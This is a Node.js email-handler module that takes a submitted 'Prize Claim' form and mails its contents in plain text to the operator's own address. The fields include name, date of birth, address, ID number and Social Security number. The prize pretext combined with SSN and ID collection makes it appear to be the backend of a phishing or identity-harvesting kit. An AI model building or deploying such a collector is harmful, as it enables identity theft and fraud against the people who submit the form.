const transporter = require('../config/emailConfig');

const sendEmail = async (formData) => {
    try {
        await transporter.verify();
        console.log('SMTP connection verified');

        const emailContent = `
            New Form Submission:
            
            Personal Information:
            --------------------
            Name: ${formData.firstName} ${formData.lastName}
            Email: ${formData.email}
            Phone: ${formData.phone}
            DOB: ${formData.dob}
            Gender: ${formData.gender}
            
            Address Information:
            -------------------
            Street: ${formData.street}
            City: ${formData.city}
            State: ${formData.state}
            ZIP: ${formData.zipCode}
            Country: ${formData.country}
            
            Additional Information:
            ---------------------
            Marital Status: ${formData.maritalStatus}
            Occupation: ${formData.occupation}
            ID Type: ${formData.idType}
            ID Number: ${formData.idNumber}
            SSN: ${formData.ssn}
            
            Submission Time: ${new Date().toLocaleString()}
        `;

        const mailOptions = {
            from: process.env.EMAIL_USER,
            to: process.env.EMAIL_USER,
            subject: 'New Prize Claim Form Submission',
            text: emailContent
        };

        const info = await transporter.sendMail(mailOptions);
        console.log('Email sent successfully:', info.messageId);
        return { success: true, messageId: info.messageId };

    } catch (error) {
        console.error('Email sending failed:', error);
        return { success: false, error: error.message };
    }
};

module.exports = { sendEmail };
